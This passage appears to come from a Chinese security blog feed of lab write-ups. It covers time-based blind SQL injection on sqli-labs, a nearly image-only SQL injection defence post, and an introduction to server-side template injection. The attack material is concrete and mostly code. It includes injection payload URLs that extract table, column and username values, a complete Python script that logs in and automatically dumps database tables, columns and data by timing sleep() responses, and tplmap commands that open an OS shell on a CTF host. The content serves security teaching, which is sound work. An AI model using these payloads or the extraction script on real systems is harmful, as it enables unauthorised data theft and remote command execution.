<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230807152828-56hda56.png" class="" title="image">​

<p>依次往下走，可以得出第三张表的表名为users。</p>
<p>4.得到表名之后猜取列名。<a href="http://localhost/sqli-labs-master/Less-9/?id=1">http://localhost/sqli-labs-master/Less-9/?id=1</a>‘ and if(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() limit 0,1),1,1))&#x3D;105,1,sleep(5))–+    得到users表中第一列的列名的第一个字符为i</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230807153911-0p2h953.png" class="" title="image">​

<p>依次往下，可得出列名为id，username，password。</p>
<p>5.得到列名之后可以猜取字段值。<a href="http://localhost/sqli-labs-master/Less-9/?id=1">http://localhost/sqli-labs-master/Less-9/?id=1</a>‘ and if(ascii(substr((select username from users  limit 0,1),1,1))&#x3D;68,1,sleep(5))–+     得到用户名的第一个字符为D</p>
<img src="/2023/10/23/SQL%E7%9B%B2%E6%B3%A8/image-20230807154005-3e2gabh.png" class="" title="image">​

<h1 id="六：实验五"><a href="#六：实验五" class="headerlink" title="六：实验五"></a>六：实验五</h1><p>1.任务描述： 突破lesson-10的实验，基于延时型的SQL盲注，按照表-&gt;列-&gt;值的顺序。查看后台源代码。</p>
<p>1.打开lesson-10，加入参数id：<a href="http://localhost/sqli-labs-master/Less-10/?id=1%E5%8A%A0%E5%85%A5%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E4%B9%9F%E6%B2%A1%E6%9C%89%E4%BB%BB%E4%BD%95%E4%B8%8D%E5%90%8C%E3%80%82">http://localhost/sqli-labs-master/Less-10/?id=1加入单双引号也没有任何不同。</a></p>
<p>2.可以来到代码层查看源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h1 id="7-脚本"><a href="#7-脚本" class="headerlink" title="7.脚本"></a>7.脚本</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># IP 地址对应修改</span></span><br><span class="line">ip_port = <span class="string">&quot;192.168.149.136:88&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;login&quot;</span>: <span class="string">&quot;bee&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;bug&quot;</span>,</span><br><span class="line">    <span class="string">&quot;security_level&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;form&quot;</span>: <span class="string">&quot;submit&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">urlLogin = <span class="string">&quot;http://%s/login.php&quot;</span> % ip_port</span><br><span class="line"><span class="comment"># 创建一个会话</span></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="comment"># 发送登录请求</span></span><br><span class="line">resp = session.post(urlLogin, data)</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="comment"># 检查是否成功登录</span></span><br><span class="line"><span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;登录成功&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;登录失败，状态码:&quot;</span>, resp.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length_of_database</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and length(database())=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">        ip_port, i)</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        rsq = session.get(url)</span><br><span class="line">        endTime = time.time()</span><br><span class="line">        ga = endTime - startTime</span><br><span class="line">        <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库名字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_name_of_database</span>():</span><br><span class="line">    <span class="comment"># 获取数据库名长度</span></span><br><span class="line">    length_of_database = get_length_of_database()</span><br><span class="line">    name_of_database = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length_of_database):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">            url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and ascii(substr(database(),%d,1))=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">            ip_port, j, k)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            rsq = session.get(url)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            ga = endTime - startTime</span><br><span class="line">            <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                name_of_database += <span class="built_in">chr</span>(k)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> name_of_database</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定库中表的数量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_count_of_tables</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and (select count(*) from information_schema.tables where table_schema=database())=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">        ip_port, i)</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        rsq = session.get(url)</span><br><span class="line">        endTime = time.time()</span><br><span class="line">        ga = endTime - startTime</span><br><span class="line">        <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定库所有表的表名长度的列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length_list_of_tables</span>():</span><br><span class="line">    <span class="comment"># 获取指定库中表的数量</span></span><br><span class="line">    count_of_tables = get_count_of_tables()</span><br><span class="line">    length_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, count_of_tables):</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and  (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">            ip_port, i, j)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            rsq = session.get(url)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            ga = endTime - startTime</span><br><span class="line">            <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            j = j + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> length_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定库中的所有表名列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tables</span>():</span><br><span class="line">    <span class="comment"># 获取指定库中表的数量</span></span><br><span class="line">    count_of_tables = get_count_of_tables()</span><br><span class="line">    <span class="comment"># 获取指定库所有表的表名长度的列表</span></span><br><span class="line">    length_list = get_length_list_of_tables()</span><br><span class="line">    name_of_tables = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, count_of_tables):</span><br><span class="line">        name = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length_list[i]):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">                url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and  (select ascii(substr((table_name),%d,1)) from information_schema.tables where table_schema=database() limit %d,1)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">                ip_port, j + <span class="number">1</span>, i, k)</span><br><span class="line">                startTime = time.time()</span><br><span class="line">                rsq = session.get(url)</span><br><span class="line">                endTime = time.time()</span><br><span class="line">                ga = endTime - startTime</span><br><span class="line">                <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                    name += <span class="built_in">chr</span>(k)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        name_of_tables.append(name)</span><br><span class="line">    <span class="keyword">return</span> name_of_tables</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定表中列的数量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_count_of_columns</span>(<span class="params">name_of_table</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and (select count(*) from information_schema.columns where table_schema=database() and table_name=\&quot;%s\&quot;)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">        ip_port, name_of_table, i)</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        rsq = session.get(url)</span><br><span class="line">        endTime = time.time()</span><br><span class="line">        ga = endTime - startTime</span><br><span class="line">        <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定表所有列的列名长度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length_list_of_columns</span>(<span class="params">name_of_table</span>):</span><br><span class="line">    count_of_columns = get_count_of_columns(name_of_table)</span><br><span class="line">    length_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, count_of_columns):</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and (select length(column_name) from information_schema.columns where table_schema=database() and table_name=\&quot;%s\&quot; limit %d,1)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">            ip_port, name_of_table, i, j)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            rsq = session.get(url)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            ga = endTime - startTime</span><br><span class="line">            <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            j = j + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> length_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定表的所有列的列名</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_columns</span>(<span class="params">name_of_table</span>):</span><br><span class="line">    count_of_columns = get_count_of_columns(name_of_table)</span><br><span class="line">    length_list = get_length_list_of_columns(name_of_table)</span><br><span class="line">    columns = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, count_of_columns):</span><br><span class="line">        name = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, length_list[i]):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">                url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and  (select ascii(substr((column_name),%d,1)) from information_schema.columns where table_schema=database() and table_name=\&quot;%s\&quot; limit %d,1)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">                ip_port, j + <span class="number">1</span>, name_of_table, i, k)</span><br><span class="line">                startTime = time.time()</span><br><span class="line">                rsq = session.get(url)</span><br><span class="line">                endTime = time.time()</span><br><span class="line">                ga = endTime - startTime</span><br><span class="line">                <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                    name += <span class="built_in">chr</span>(k)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        columns.append(name)</span><br><span class="line">    <span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定表指定列名数据个数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_count_of_datas</span>(<span class="params">name_of_table, name_of_column</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and (select count(%s) from %s)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">        ip_port, name_of_column, name_of_table, i)</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        rsq = session.get(url)</span><br><span class="line">        endTime = time.time()</span><br><span class="line">        ga = endTime - startTime</span><br><span class="line">        <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取指定表指定列名数据长度列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_length_list_of_datas</span>(<span class="params">name_of_table, name_of_column</span>):</span><br><span class="line">    count_of_datas = get_count_of_datas(name_of_table, name_of_column)</span><br><span class="line">    length_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, count_of_datas):</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and (select length(%s) from %s limit %d,1)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">            ip_port, name_of_column, name_of_table, i, j)</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            rsq = session.get(url)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            ga = endTime - startTime</span><br><span class="line">            <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> length_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_datas</span>(<span class="params">name_of_table, name_of_column</span>):</span><br><span class="line">    count_of_datas = get_count_of_datas(name_of_table, name_of_column)</span><br><span class="line">    length_list = get_length_list_of_datas(name_of_table, name_of_column)</span><br><span class="line">    datas = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count_of_datas):</span><br><span class="line">        data = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(length_list[i]):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">                url = <span class="string">&quot;http://%s/sqli_15.php?title=World War Z&#x27; and (select ascii(substr((%s),%d,1)) from %s limit %d,1)=%d and sleep(1) -- &amp;action=search&quot;</span> % (</span><br><span class="line">                ip_port, name_of_column, j + <span class="number">1</span>, name_of_table, i, k)</span><br><span class="line">                startTime = time.time()</span><br><span class="line">                rsq = session.get(url)</span><br><span class="line">                endTime = time.time()</span><br><span class="line">                ga = endTime - startTime</span><br><span class="line">                <span class="keyword">if</span> ga &gt; <span class="number">1</span>:</span><br><span class="line">                    data += <span class="built_in">chr</span>(k)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        datas.append(data)</span><br><span class="line">    <span class="keyword">return</span> datas</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Judging the database...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Getting the table name...&quot;</span>)</span><br><span class="line">    tables = get_tables()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tables:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]%s&quot;</span> % (i))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The table names in this database are:%s&quot;</span> % (tables))</span><br><span class="line">    table = <span class="built_in">input</span>(<span class="string">&quot;Select the Table name:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> table <span class="keyword">not</span> <span class="keyword">in</span> tables:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Getting the column names in the %s table......&quot;</span> % (table))</span><br><span class="line">    columns = get_columns(table)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> columns:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]%s&quot;</span> % (i))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;The column name in %s are:%s&quot;</span> % (table, columns))</span><br><span class="line">        column = <span class="built_in">input</span>(<span class="string">&quot;Select the Column name:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> column <span class="keyword">not</span> <span class="keyword">in</span> columns:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Getting the datas......&quot;</span>)</span><br><span class="line">        datas = get_datas(table, column)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> datas:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]%s&quot;</span> % (i))</span><br><span class="line">        choice = <span class="built_in">input</span>(<span class="string">&quot;是否结束？Y/N&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">&#x27;Y&#x27;</span> <span class="keyword">or</span> choice ==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>SQL注入防御</title>
    <url>/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="SQL注入防御"><a href="#SQL注入防御" class="headerlink" title="SQL注入防御"></a>SQL注入防御</h1><h2 id="1-原因"><a href="#1-原因" class="headerlink" title="1.原因"></a>1.原因</h2><img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007084910-na22kcj.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007084926-cj41vy3.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007084952-yjplwzb.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085041-p5u4kk5.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085158-xsstgq0.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085242-dygddfl.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085250-7v0mrtt.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085300-lkw1i38.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085647-i2muh3p.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085703-yxfb4v9.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085811-w1ta0n8.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085916-qu422a4.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007085937-91fxj4x.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090103-yk0pe1l.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090142-pz5bgwl.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090206-69gw2eb.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090221-kaowt7m.png" class="" title="image">​

<h2 id="2-过滤防御"><a href="#2-过滤防御" class="headerlink" title="2.过滤防御"></a>2.过滤防御</h2><img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090342-2zok2mn.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090359-morxzod.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090430-az7exnc.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090455-gqhf3uc.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090514-rlvt4dm.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090523-l92nh5m.png" class="" title="image">​

<img src="/2023/10/23/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/image-20231007090645-3i8kp97.png" class="" title="image">​

<p>‍</p>
<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>SSTI(服务器端模板注入)</title>
    <url>/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="SSTI-服务器端模板注入"><a href="#SSTI-服务器端模板注入" class="headerlink" title="SSTI(服务器端模板注入)"></a>SSTI(服务器端模板注入)</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前。</p>
<p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p>
<h2 id="2-SSTI（模板注入）"><a href="#2-SSTI（模板注入）" class="headerlink" title="2.SSTI（模板注入）"></a>2.<strong>SSTI（模板注入）</strong></h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p>
<p>当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。</p>
<p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<p>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
<p>‍</p>
<h2 id="3-神器tplmap-需要python2环境"><a href="#3-神器tplmap-需要python2环境" class="headerlink" title="3.神器tplmap(需要python2环境)"></a>3.神器tplmap(需要python2环境)</h2><p>该工具自动检测和发掘服务器端模板的注入漏洞。支持测试Mako, Jinja2, Jade, Smarty, Freemarker, Velocity, 和Twig</p>
<h3 id="tplmap"><a href="#tplmap" class="headerlink" title="tplmap"></a>tplmap</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 tplmap.py -u http://eaf030c6-85cd-45a9-9c92-ec0bb882e399.www.polarctf.com:<span class="number">8090</span>/?name=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011161056-03kha71.png" class="" title="image">

<p>可以看到爆出了存在漏洞的参数和后端使用的模板引擎，接下来直接—os-shell一把梭就好了​</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 tplmap.py -u http://eaf030c6-85cd-45a9-9c92-ec0bb882e399.www.polarctf.com:<span class="number">8090</span>/?name=<span class="number">1</span> --engine=Jinja2 </span><br><span class="line">--os-shell</span><br></pre></td></tr></table></figure>

<img src="/2023/10/23/SSTI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20231011161400-6h0u1b6.png" class="" title="image">​

